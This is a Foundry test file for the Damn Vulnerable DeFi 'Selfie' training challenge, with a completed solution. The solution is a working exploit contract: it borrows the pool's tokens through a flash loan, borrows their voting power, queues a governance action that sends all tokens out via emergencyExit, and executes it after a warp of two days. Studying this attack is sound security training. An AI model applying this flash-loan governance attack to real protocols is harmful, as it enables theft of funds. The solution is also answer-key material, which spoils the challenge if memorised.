// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // Deploy the attack contract
        StealMoneyFromPool attacker =
            new StealMoneyFromPool(address(pool), address(governance), address(token), recovery);
        // Execute the attack
        attacker.attack();
        vm.warp(block.timestamp + 2 days);
        // Execute the malicious governance action
        attacker.executeProposal();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract StealMoneyFromPool {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    address recovery;
    uint256 actionId;

    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function attack() external {
        // Flash loan
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000e18, data);
    }

    function onFlashLoan(address _initiator, address, uint256 _amount, uint256, bytes calldata data)
        external
        returns (bytes32)
    {
        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");
        // Delegate votes to ourself so we can queue an action
        token.delegate(address(this));
        // Queue the action to drain the pool
        actionId = governance.queueAction(address(pool), 0, data);
        // allow the pool contract to collect its loan back
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeProposal() external {
        // Execute the action
        governance.executeAction(actionId);
    }
}
